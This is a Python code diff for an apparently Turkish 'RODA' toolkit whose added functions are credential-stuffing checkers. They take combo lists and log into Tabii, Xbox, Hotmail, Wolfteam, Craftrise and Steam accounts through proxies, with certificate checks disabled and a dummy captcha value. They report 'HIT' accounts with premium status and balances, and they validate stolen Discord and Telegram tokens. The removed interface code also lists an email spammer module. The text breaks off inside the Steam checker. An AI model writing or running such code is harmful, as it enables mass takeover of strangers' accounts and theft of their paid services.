+    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
+    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
+    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
+    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
+    {"name": "Xbox & MC", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
+    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
+    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
+    {"name": "Wolfteam", "domain": "joygame.com", "icon": "fa-solid fa-skull"},
+    {"name": "Craftrise", "domain": "craftrise.com.tr", "icon": "fa-solid fa-hammer"},
+    {"name": "Hotmail", "domain": "outlook.com", "icon": "fa-solid fa-envelope"},
+    {"name": "Token Check", "domain": "discord.com", "icon": "fa-solid fa-key"},
+    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
+    {"name": "Supercell", "domain": "supercell.com", "icon": "fa-solid fa-gamepad"},
+    {"name": "Roda Inbox", "domain": "outlook.com", "icon": "fa-solid fa-inbox"},
+]
 
-    def paintEvent(self, event):
-        painter = QPainter(self); painter.setRenderHint(QPainter.RenderHint.Antialiasing); rect = self.rect()
-        if self.isChecked():
-            self.vector_icon.set_active(True); self.label.setStyleSheet("color: #ffffff; font-weight: 700; font-size: 13px; background: transparent;")
-            painter.setBrush(QColor(188, 19, 254, 35)); painter.setPen(Qt.PenStyle.NoPen); painter.drawRoundedRect(rect, 10, 10)
-            painter.setBrush(QColor(255, 0, 255)); painter.drawRoundedRect(0, 12, 3, 26, 1.5, 1.5)
+# ============================================================
+# TÜM CHECKER FONKSİYONLARI
+# ============================================================
+
+# ---- TABII ----
+TABII_BASE = "https://eu1.tabii.com/apigateway"
+
+def check_tabii_account(email, password, proxy=None):
+    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.tabii.com",
+        "Referer": "https://www.tabii.com/"
+    })
+    if proxies:
+        session.proxies.update(proxies)
+    session.verify = False
+    result = {"status": "ERROR", "details": {"full_name": "?", "subscription": "?", "premium": False, "expire": "?", "profiles_count": 0}, "message": ""}
+    try:
+        r = session.post(f"{TABII_BASE}/auth/v2/login", json={"email": email, "password": password}, timeout=15)
+        if r.status_code != 200:
+            result["status"] = "BAD"
+            result["message"] = f"HTTP {r.status_code}"
+            return result
+        data = r.json()
+        token = data.get("accessToken")
+        if not token:
+            result["status"] = "BAD"
+            result["message"] = "Token missing"
+            return result
+        headers = {"Authorization": f"Bearer {token}"}
+        r = session.get(f"{TABII_BASE}/auth/v2/me", headers=headers, timeout=10)
+        if r.status_code != 200:
+            result["status"] = "HIT"
+            result["message"] = "Giriş başarılı (detaylar alınamadı)"
+            return result
+        user = r.json()
+        name = user.get("name", "Unknown")
+        surname = user.get("surname", "")
+        full_name = f"{name} {surname}".strip()
+        sub = user.get("subscription", {})
+        subscription = sub.get("title", sub.get("name", "Free"))
+        premium = subscription.lower() == "premium"
+        expire = sub.get("expireDate", "")[:10] if sub.get("expireDate") else "N/A"
+        r = session.get(f"{TABII_BASE}/profiles/v2/", headers=headers, timeout=10)
+        profiles_count = 0
+        if r.status_code == 200:
+            prof_data = r.json()
+            if isinstance(prof_data, list):
+                profiles_count = len(prof_data)
+        result["status"] = "HIT"
+        result["message"] = "Giriş başarılı"
+        result["details"]["full_name"] = full_name
+        result["details"]["subscription"] = subscription
+        result["details"]["premium"] = premium
+        result["details"]["expire"] = expire
+        result["details"]["profiles_count"] = profiles_count
+        add_log(f"Tabii HIT: {email} | {full_name} | {subscription}", "SUCCESS")
+    except Exception as e:
+        result["status"] = "ERROR"
+        result["message"] = str(e)[:60]
+    finally:
+        session.close()
+    return result
+
+# ---- XBOX (GERÇEK) ----
+def check_xbox_account(email, password):
+    session = requests.Session()
+    session.verify = False
+    try:
+        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
+        resp = session.get(sftag_url, timeout=10)
+        sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
+        url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
+        if not sftag_match or not url_match:
+            return {"status": "CUSTOM", "message": "Token alınamadı"}
+        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
+        login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
+        if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
+            return {"status": "2FA", "message": "2FA gerekli"}
+        if "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
+            return {"status": "BAD", "message": "Hatalı giriş"}
+        if '#' in login_req.url:
+            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', ["None"])[0]
+            if ms_token != "None":
+                try:
+                    xbox_token, uhs = get_xbox_token(session, ms_token)
+                    if xbox_token and uhs:
+                        xsts = get_xsts_token(session, xbox_token)
+                        if xsts:
+                            profile = get_xbox_profile(session, uhs, xsts)
+                            gamertag = profile.get("gamertag", "N/A")
+                            tier = profile.get("tier", "N/A")
+                            return {"status": "HIT", "message": f"Xbox/MC | Gamertag: {gamertag} | Tier: {tier}", "details": {"gamertag": gamertag, "tier": tier}}
+                except:
+                    pass
+                return {"status": "HIT", "message": f"Xbox/MC giriş başarılı", "details": {"token": ms_token[:20] + "..."}}
+        return {"status": "CUSTOM", "message": "Bağlı değil/Xbox yok"}
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
+
+def get_xbox_token(session, ms_token):
+    try:
+        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
+        resp = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
+    except:
+        pass
+    return None, None
+
+def get_xsts_token(session, xbox_token):
+    try:
+        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
+        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
+        if resp.status_code == 200:
+            return resp.json().get('Token')
+    except:
+        pass
+    return None
+
+def get_xbox_profile(session, uhs, xsts_token):
+    try:
+        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
+        resp = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep", headers={"Authorization": auth_header, "x-xbl-contract-version": "2", "Accept": "application/json"}, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            settings = {s["id"]: s.get("value", "N/A") for s in data.get("profileUsers", [{}])[0].get("settings", [])}
+            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A")}
+    except:
+        pass
+    return {"gamertag": "N/A", "tier": "N/A"}
+
+# ---- WOLFTEAM ----
+def check_wolfteam_account(email, password):
+    try:
+        session = requests.Session()
+        login_url = f"https://bservices.joygame.com/Hesap/JsonpLogin?callback=JG.ProccessLoginResponse&TopbarLoginUserName={quote(email)}&TopbarLoginPassword={quote(password)}&TopbarLoginRemember=true&FormId=tb-login-form&siteLang=tr"
+        headers = {"User-Agent": generate_user_agent()}
+        r = session.get(login_url, headers=headers, timeout=10)
+        if '"IsSucceeded":true' in r.text:
+            jp = re.search(r',"JpBalance":([^,}]+)', r.text)
+            jp_val = jp.group(1).strip('"') if jp else "0"
+            return {"status": "HIT", "message": f"JP: {jp_val}", "details": {"jp": jp_val}}
+        elif '"IsSucceeded":false' in r.text:
+            return {"status": "BAD", "message": "Hatalı giriş"}
         else:
-            self.vector_icon.set_active(False); self.label.setStyleSheet("color: #94a3b8; font-weight: 600; font-size: 13px; background: transparent;")
-            if self._glow_alpha > 0:
-                painter.setBrush(QColor(255, 255, 255, int(self._glow_alpha * 0.4))); painter.setPen(Qt.PenStyle.NoPen); painter.drawRoundedRect(rect, 10, 10)
+            return {"status": "CUSTOM", "message": "Bilinmeyen hata"}
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
 
-# ==============================================================================
-# UNIVERSAL CHECKER WIDGET
-# ==============================================================================
-class UniversalCheckerWidget(QWidget):
-    def __init__(self, title, help_text, worker_class, statuses, needs_combo=True, parent=None):
-        super().__init__(parent)
-        self.title = title; self.help_text = help_text; self.worker_class = worker_class; self.statuses = statuses
-        self.needs_combo = needs_combo
-        self.combos = []; self.worker = None; self.active_filter = "ALL"
-        self.counters = {k: 0 for k in self.statuses.keys()}
-        self.setup_ui()
-
-    def apply_btn_style(self, btn, base_color="#ff00ff", hover_color="#d946ef"):
-        btn.setCursor(Qt.CursorShape.PointingHandCursor)
-        btn.setStyleSheet(f"""
-            QPushButton {{ background-color: {base_color}; color: #ffffff; font-weight: 700; font-size: 13px; border: none; border-radius: 10px; padding: 12px 24px; }}
-            QPushButton:hover {{ background-color: {hover_color}; }}
-        """)
-
-    def setup_ui(self):
-        layout = QVBoxLayout(self); layout.setContentsMargins(40, 20, 40, 40)
-        
-        header_layout = QHBoxLayout()
-        lbl = QLabel(self.title); lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;"); header_layout.addWidget(lbl)
-        btn_help = QPushButton("?"); btn_help.setFixedSize(30, 30); btn_help.setStyleSheet("QPushButton { background-color: rgba(188, 19, 254, 0.4); color: white; border-radius: 15px; font-weight: bold; font-size: 16px; } QPushButton:hover { background-color: rgba(188, 19, 254, 0.8); }"); btn_help.setCursor(Qt.CursorShape.PointingHandCursor); btn_help.clicked.connect(self.show_help)
-        header_layout.addWidget(btn_help); header_layout.addStretch(); layout.addLayout(header_layout); layout.addSpacing(15)
-
-        controls_layout = QHBoxLayout()
-        if self.needs_combo:
-            self.lbl_combo = QLabel("Combo Bekleniyor...")
-            self.lbl_combo.setStyleSheet("color: #94a3b8; font-size: 13px;")
-            btn_combo = QPushButton("Combo Seç")
-            self.apply_btn_style(btn_combo, "#3b82f6", "#2563eb")
-            btn_combo.clicked.connect(self.select_combo)
-            controls_layout.addWidget(self.lbl_combo, stretch=1)
-            controls_layout.addWidget(btn_combo)
+# ---- CRAFTRISE ----
+def check_craftrise_account(email, password):
+    try:
+        session = requests.Session()
+        login_url = "https://www.craftrise.com.tr/posts/post-login.php"
+        headers = {"User-Agent": generate_user_agent(), "X-Requested-With": "XMLHttpRequest"}
+        data = {"value": email, "password": password, "grecaptcharesponse": "dummy"}
+        r = session.post(login_url, headers=headers, data=data, timeout=10)
+        res = r.json()
+        if res.get("resultType") == "success" or "başarıyla" in res.get("resultMessage", "").lower():
+            rc_page = session.get("https://www.craftrise.com.tr/shop", headers=headers, timeout=5)
+            soup = BeautifulSoup(rc_page.text, "html.parser")
+            rc = soup.find('span', class_='rcCount')
+            rc_val = rc.text.strip() if rc else "0"
+            return {"status": "HIT", "message": f"RC: {rc_val}", "details": {"rc": rc_val}}
         else:
-            self.tiktok_len = QComboBox(); self.tiktok_len.addItems(["Karakter Uzunluğu: 4-6", "Karakter Uzunluğu: 6-8"])
-            self.tiktok_thread = QComboBox(); self.tiktok_thread.addItems(["İş Parçacığı (Thread): 1", "İş Parçacığı (Thread): 3", "İş Parçacığı (Thread): 5", "İş Parçacığı (Thread): 8"]); self.tiktok_thread.setCurrentText("İş Parçacığı (Thread): 3")
-            controls_layout.addWidget(self.tiktok_len, stretch=1); controls_layout.addWidget(self.tiktok_thread)
+            return {"status": "BAD", "message": "Hatalı giriş"}
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
 
-        self.btn_start = QPushButton("Başlat"); self.apply_btn_style(self.btn_start, "#bc13fe", "#a811e3"); self.btn_start.clicked.connect(self.toggle_process)
-        controls_layout.addWidget(self.btn_start); layout.addLayout(controls_layout); layout.addSpacing(20)
+# ---- HOTMAIL ----
+def check_hotmail_account(email, password):
+    try:
+        session = requests.Session()
+        session.verify = False
+        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
+        resp = session.get(sftag_url, timeout=10)
+        sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
+        url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
+        if not sftag_match or not url_match:
+            return {"status": "CUSTOM", "message": "Token alınamadı"}
+        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
+        login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
+        if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
+            return {"status": "2FA", "message": "2FA gerekli"}
+        if "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
+            return {"status": "BAD", "message": "Hatalı giriş"}
+        if '#access_token=' in login_req.url:
+            return {"status": "HIT", "message": "Hotmail giriş başarılı"}
+        return {"status": "CUSTOM", "message": "Bilinmeyen durum"}
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
 
-        self.stats_layout = QHBoxLayout()
-        self.stat_buttons = {}
-        for status, color in self.statuses.items():
-            btn = QPushButton(f"{status}: 0"); btn.setCheckable(True); btn.setCursor(Qt.CursorShape.PointingHandCursor)
-            btn.setStyleSheet(f"""QPushButton {{ background-color: rgba(255, 255, 255, 0.05); color: {color}; border: 2px solid {color}; border-radius: 8px; padding: 10px; font-weight: bold; font-size: 14px; }} QPushButton:checked {{ background-color: {color}; color: #000000; }}""")
-            btn.clicked.connect(lambda checked, s=status: self.filter_results(s, checked))
-            self.stats_layout.addWidget(btn); self.stat_buttons[status] = btn
-        
-        btn_all = QPushButton("Tümünü Göster"); btn_all.setCursor(Qt.CursorShape.PointingHandCursor); btn_all.setStyleSheet("background-color: rgba(255,255,255,0.1); color: white; border: none; border-radius: 8px; padding: 10px; font-weight: bold;"); btn_all.clicked.connect(self.show_all_results); self.stats_layout.addWidget(btn_all)
-        layout.addLayout(self.stats_layout); layout.addSpacing(10)
-
-        self.log_list = QListWidget(); layout.addWidget(self.log_list, stretch=1)
-
-    def show_help(self):
-        msg = QMessageBox(self); msg.setWindowTitle(self.title + " - Yardım"); msg.setText(self.help_text); msg.setStyleSheet("QMessageBox { background-color: #0c0618; color: white; } QLabel { color: white; font-size: 13px; } QPushButton { background-color: #bc13fe; color: white; padding: 5px 15px; border-radius: 5px; }"); msg.exec()
-
-    def select_combo(self):
-        file, _ = QFileDialog.getOpenFileName(self, "Combo Dosyası Seç", "", "Text Files (*.txt)")
-        if file:
-            with open(file, "r", encoding="utf-8") as f: self.combos = [l.strip() for l in f.readlines() if ":" in l]
-            self.lbl_combo.setText(f"Yüklendi: {len(self.combos)} Satır")
-
-    def toggle_process(self):
-        if self.worker is not None and self.worker.isRunning():
-            self.worker.stop(); self.btn_start.setText("Başlat"); self.apply_btn_style(self.btn_start, "#bc13fe", "#a811e3")
-        else:
-            if self.needs_combo and not self.combos: return 
-            
-            self.log_list.clear(); self.counters = {k: 0 for k in self.statuses.keys()}; self.update_counters()
-            
-            if self.needs_combo: self.worker = self.worker_class(self.combos)
-            else:
-                l_mode = self.tiktok_len.currentText().split(": ")[1]
-                t_count = self.tiktok_thread.currentText().split(": ")[1]
-                self.worker = self.worker_class(l_mode, t_count)
-                
-            self.worker.log_signal.connect(self.add_log); self.worker.finished_signal.connect(self.on_finished); self.worker.start()
-            self.btn_start.setText("Durdur"); self.apply_btn_style(self.btn_start, "#ef4444", "#dc2626")
-
-    def on_finished(self): self.btn_start.setText("Başlat"); self.apply_btn_style(self.btn_start, "#bc13fe", "#a811e3")
-
-    def add_log(self, status, message):
-        if status not in self.statuses: return
-        self.counters[status] += 1; self.update_counters()
-        color = self.statuses[status]; formatted_text = f"<font color='{color}'><b>[{status}]</b></font> {message}"
-        item = QListWidgetItem(); item.setData(Qt.ItemDataRole.UserRole, status)
-        lbl = QLabel(formatted_text); lbl.setStyleSheet("background: transparent; color: #e2e8f0; font-family: 'Consolas', monospace; font-size: 13px;")
-        self.log_list.addItem(item); self.log_list.setItemWidget(item, lbl)
-        if self.active_filter != "ALL" and self.active_filter != status: item.setHidden(True)
-        else: self.log_list.scrollToBottom()
-
-    def update_counters(self):
-        for status, btn in self.stat_buttons.items(): btn.setText(f"{status}: {self.counters[status]}")
-
-    def filter_results(self, status, checked):
-        if not checked: self.show_all_results(); return
-        self.active_filter = status
-        for s, btn in self.stat_buttons.items():
-            if s != status: btn.setChecked(False)
-        for i in range(self.log_list.count()):
-            item = self.log_list.item(i); item.setHidden(item.data(Qt.ItemDataRole.UserRole) != status)
-
-    def show_all_results(self):
-        self.active_filter = "ALL"
-        for btn in self.stat_buttons.values(): btn.setChecked(False)
-        for i in range(self.log_list.count()): self.log_list.item(i).setHidden(False)
-        self.log_list.scrollToBottom()
-
-# ==============================================================================
-# RODA ENGINE (ANA UYGULAMA)
-# ==============================================================================
-class RodaEngine(QMainWindow):
-    def __init__(self):
-        super().__init__()
-        self.network_manager = QNetworkAccessManager(self)
-        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
-        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
-        self.resize(1300, 800)
-        self.setStyleSheet(RODA_STIL)
-        self.drag_offset = QPoint()
-        self.aktif_calisanlar = {}
-        
-        self.canvas = QWidget()
-        self.canvas.setObjectName("CoreCanvas")
-        self.setCentralWidget(self.canvas)
-        self.canvas_layout = QVBoxLayout(self.canvas)
-        self.canvas_layout.setContentsMargins(0, 0, 0, 0)
-        self.master_stack = QStackedWidget()
-        self.canvas_layout.addWidget(self.master_stack)
-        
-        self.build_boot_sequence()
-        self.build_toolkit_dashboard()
-        
-        self.master_stack.setCurrentIndex(0)
-        QTimer.singleShot(2500, self.transition_to_main)
-        self.hw_timer = QTimer(self)
-        self.hw_timer.timeout.connect(self.update_hardware)
-        self.hw_timer.start(1500)
-
-    def show_placeholder_logo(self, target_label, text):
-        target_label.setText(text)
-        target_label.setStyleSheet("color: rgba(188, 19, 254, 0.9); font-size: 16px; font-weight: 900; letter-spacing: 4px; padding-left: 5px;")
-
-    def build_boot_sequence(self):
-        self.boot_widget = QWidget()
-        layout = QVBoxLayout(self.boot_widget)
-        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        self.boot_bg = NeonSnowCanvas(self.boot_widget)
-        self.boot_bg.setGeometry(0, 0, 1300, 800)
-        self.boot_bg.lower()
-        self.logo_label = QLabel()
-        self.show_placeholder_logo(self.logo_label, "R O D A")
-        self.logo_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        self.sync_status = QLabel("RODA SYSTEM INITIALIZED // SECURE CONNECTION LAUNCHED")
-        self.sync_status.setStyleSheet("color: rgba(188, 19, 254, 0.8); font-family: 'Consolas', monospace; font-size: 12px; letter-spacing: 3px; margin-top: 25px;")
-        self.sync_status.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        layout.addWidget(self.logo_label)
-        layout.addWidget(self.sync_status)
-        self.master_stack.addWidget(self.boot_widget)
-
-    def transition_to_main(self):
-        dash = self.master_stack.widget(1)
-        opacity = QGraphicsOpacityEffect(dash)
-        dash.setGraphicsEffect(opacity)
-        self.master_stack.setCurrentIndex(1)
-        self.trans_anim = QPropertyAnimation(opacity, b"opacity")
-        self.trans_anim.setDuration(600)
-        self.trans_anim.setStartValue(0.0)
-        self.trans_anim.setEndValue(1.0)
-        self.trans_anim.setEasingCurve(QEasingCurve.Type.OutQuad)
-        self.trans_anim.start()
-        QTimer.singleShot(800, lambda: RodaToastNotification("Sistem Devrede", "Tüm siber modüller başarıyla yüklendi.", self.canvas))
-
-    def build_toolkit_dashboard(self):
-        self.dash_page = QWidget()
-        self.dash_bg = NeonSnowCanvas(self.dash_page)
-        self.dash_bg.setGeometry(0, 0, 1300, 800)
-        self.dash_bg.lower()
-        main_dash_layout = QHBoxLayout(self.dash_page)
-        main_dash_layout.setContentsMargins(0, 0, 0, 0)
-        main_dash_layout.setSpacing(0)
-        
-        sidebar = QFrame()
-        sidebar.setObjectName("SidebarFrame")
-        sidebar.setFixedWidth(280)
-        sidebar_main_layout = QVBoxLayout(sidebar)
-        sidebar_main_layout.setContentsMargins(10, 30, 10, 15)
-        
-        brand_lbl = QLabel()
-        brand_lbl.setObjectName("SidebarLogo")
-        brand_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        self.show_placeholder_logo(brand_lbl, "RODA")
-        sidebar_main_layout.addWidget(brand_lbl)
-        sidebar_main_layout.addSpacing(15)
-
-        scroll_area = QScrollArea()
-        scroll_area.setWidgetResizable(True)
-        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
-        scroll_content = QWidget()
-        self.sidebar_layout = QVBoxLayout(scroll_content)
-        self.sidebar_layout.setContentsMargins(10, 0, 10, 0)
-        self.sidebar_layout.setSpacing(8)
-        self.menu_registry = []
-        self.view_stack = QStackedWidget()
-        
-        modules = [
-            ("Ana Sayfa", "dashboard", self.create_dashboard_view),
-            ("Proxy Scrape & Check", "proxy", self.create_proxy_view),
-            ("TikTok Gen & Check", "tiktok", self.create_tiktok_view),
-            ("Xbox & MC Checker", "xbox", self.create_xbox_view),
-            ("Wolfteam Checker", "wolfteam", self.create_wolfteam_view),
-            ("Craftrise Checker", "craftrise", self.create_craftrise_view),
-            ("Temp Mail", "mail", self.create_temp_mail_view),
-            ("Email Spammer", "spam", self.create_spammer_view),
-            ("Token Check", "token", self.create_token_view),
-            ("Hotmail Checker", "checker", self.create_hotmail_view)
-        ]
-        
-        for i, (name, icon, view_factory) in enumerate(modules):
-            btn = NeonGlowButton(name, icon)
-            btn.clicked.connect(lambda checked, idx=i: self.switch_view_node(idx))
-            self.sidebar_layout.addWidget(btn)
-            self.menu_registry.append(btn)
-            self.view_stack.addWidget(view_factory())
-            
-        self.sidebar_layout.addStretch()
-        scroll_area.setWidget(scroll_content)
-        sidebar_main_layout.addWidget(scroll_area)
-        self.menu_registry[0].setChecked(True)
-        main_dash_layout.addWidget(sidebar)
-        
-        right_container = QWidget()
-        right_layout = QVBoxLayout(right_container)
-        right_layout.setContentsMargins(0, 0, 0, 0)
-        right_layout.setSpacing(0)
-        window_controls_layout = QHBoxLayout()
-        window_controls_layout.setContentsMargins(0, 12, 16, 0)
-        window_controls_layout.addStretch()
-        min_btn = QPushButton("-")
-        min_btn.setObjectName("WindowBtn")
-        min_btn.setFixedSize(32, 28)
-        min_btn.clicked.connect(self.showMinimized)
-        close_btn = QPushButton("x")
-        close_btn.setObjectName("CloseBtn")
-        close_btn.setFixedSize(32, 28)
-        close_btn.clicked.connect(self.close)
-        window_controls_layout.addWidget(min_btn)
-        window_controls_layout.addWidget(close_btn)
-        right_layout.addLayout(window_controls_layout)
-        right_layout.addWidget(self.view_stack)
-        main_dash_layout.addWidget(right_container)
-        self.master_stack.addWidget(self.dash_page)
-
-    def switch_view_node(self, target_index):
-        self.view_stack.setCurrentIndex(target_index)
-        for i, btn in enumerate(self.menu_registry):
-            btn.setChecked(i == target_index)
-
-    def apply_btn_style(self, btn, base_color="#ff00ff", hover_color="#d946ef"):
-        btn.setCursor(Qt.CursorShape.PointingHandCursor)
-        btn.setStyleSheet(f"QPushButton {{ background-color: {base_color}; color: #ffffff; font-weight: 700; font-size: 13px; border: none; border-radius: 10px; padding: 12px 24px; }} QPushButton:hover {{ background-color: {hover_color}; }}")
-
-    # ========== GÖRÜNÜMLER ==========
-    def create_dashboard_view(self):
-        view = QWidget()
-        layout = QVBoxLayout(view)
-        layout.setContentsMargins(40, 20, 40, 40)
-        lbl = QLabel("RODA - Sistem Veri & Analiz Paneli")
-        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800; letter-spacing: 0.5px;")
-        layout.addWidget(lbl)
-        layout.addSpacing(25)
-        grid = QGridLayout()
-        grid.setSpacing(20)
-        self.cpu_card = self.create_info_card("CPU Yük Endeksi", "%0", "cpu", "rgba(188, 19, 254, 0.9)")
-        self.ram_card = self.create_info_card("RAM Bellek Hacmi", "%0", "ram", "#00f0ff")
-        self.tools_card = self.create_info_card("Aktif Sistem Modülü", "10 Modül", "dashboard", "#a855f7")
-        grid.addWidget(self.cpu_card[0], 0, 0)
-        grid.addWidget(self.ram_card[0], 0, 1)
-        grid.addWidget(self.tools_card[0], 1, 0, 1, 2)
-        layout.addLayout(grid, stretch=1)
-        return view
-
-    def create_info_card(self, title, val, icon_mode, color):
-        card = QFrame()
-        card.setStyleSheet("background-color: rgba(12, 6, 24, 0.65); border: none; border-radius: 14px;")
-        c_layout = QVBoxLayout(card)
-        c_layout.setContentsMargins(25, 25, 25, 25)
-        top_h = QHBoxLayout()
-        icon = ToolkitVectorIcon(icon_mode)
-        icon.set_active(True)
-        top_h.addWidget(icon)
-        t_lbl = QLabel(title)
-        t_lbl.setStyleSheet("color: #94a3b8; font-size: 15px; font-weight: 700;")
-        top_h.addWidget(t_lbl)
-        top_h.addStretch()
-        v_lbl = QLabel(val)
-        v_lbl.setStyleSheet(f"color: {color}; font-size: 28px; font-weight: 800; margin-top: 10px;")
-        c_layout.addLayout(top_h)
-        c_layout.addWidget(v_lbl)
-        c_layout.addStretch()
-        return card, v_lbl
-
-    def update_hardware(self):
+# ---- TOKEN CHECK ----
+def check_token(token_type, token):
+    if token_type == "discord":
+        headers = {"Authorization": token}
+        is_bot = False
         try:
-            self.cpu_card[1].setText(f"% {psutil.cpu_percent()}")
-            self.ram_card[1].setText(f"% {psutil.virtual_memory().percent}")
+            res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
+            if res.status_code != 200:
+                headers = {"Authorization": f"Bot {token}"}
+                res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
+                is_bot = True
+            if res.status_code == 200:
+                data = res.json()
+                user_type = "Bot" if is_bot else "User"
+                username = f"{data.get('username')}#{data.get('discriminator', '0000')}"
+                email = data.get('email', 'Yok')
+                nitro = "Var" if data.get('premium_type', 0) > 0 else "Yok"
+                mfa = "Aktif" if data.get('mfa_enabled') else "Pasif"
+                return {"status": "HIT", "message": f"{user_type} | {username} | Nitro:{nitro} | 2FA:{mfa}", "details": {"email": email}}
+            else:
+                return {"status": "BAD", "message": "Geçersiz token"}
+        except Exception as e:
+            return {"status": "ERROR", "message": str(e)[:60]}
+    elif token_type == "telegram":
+        try:
+            res = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
+            if res.status_code == 200 and res.json().get("ok"):
+                data = res.json().get('result', {})
+                return {"status": "HIT", "message": f"Bot: @{data.get('username')} (ID: {data.get('id')})"}
+            else:
+                return {"status": "BAD", "message": "Geçersiz token"}
+        except Exception as e:
+            return {"status": "ERROR", "message": str(e)[:60]}
+    return {"status": "ERROR", "message": "Bilinmeyen token tipi"}
+
+# ---- TIKTOK GEN ----
+def check_tiktok_username(username):
+    try:
+        headers = {"User-Agent": generate_user_agent()}
+        r = requests.head(f"https://www.tiktok.com/@{username}", headers=headers, timeout=5)
+        if r.status_code == 404:
+            return {"status": "HIT", "message": f"@{username} kullanılabilir"}
+        elif r.status_code == 200:
+            return {"status": "BAD", "message": f"@{username} alınmış"}
+        else:
+            return {"status": "CUSTOM", "message": f"Limit/Ban"}
+    except:
+        return {"status": "ERROR", "message": "Bağlantı hatası"}
+
+# ---- STEAM ----
+def check_steam_account(username, password, proxy_url=None):
+    try:
+        # Bu fonksiyon için pycryptodome gerekli. Render'da yoksa BAD döner.
+        try:
+            from Crypto.PublicKey import RSA
+            from Crypto.Cipher import PKCS1_v1_5
+        except ImportError:
+            return {"status": "ERROR", "message": "Crypto kütüphanesi yok! pip install pycryptodome"}
+
+        session = requests.Session()
+        if proxy_url:
+            session.proxies = {"http": proxy_url, "https": proxy_url}
+
+        rsa_resp = session.get("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/", params={"account_name": username}, timeout=10).json()
+        rsa_data = rsa_resp.get("response", {})
+        if not rsa_data.get("publickey_mod"):
+            return {"status": "BAD", "message": "RSA anahtarı alınamadı"}
+
+        key = RSA.construct((int(rsa_data["publickey_mod"], 16), int(rsa_data["publickey_exp"], 16)))
+        enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()
+
+        resp = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
+            data={"account_name": username, "encrypted_password": enc_pwd, "encryption_timestamp": rsa_data["timestamp"],
+                  "remember_login": "true", "website_id": "Community", "device_friendly_name": "Chrome Browser"}, timeout=10).json().get("response", {})
+
+        steamid = resp.get("steamid")
+        if not steamid:
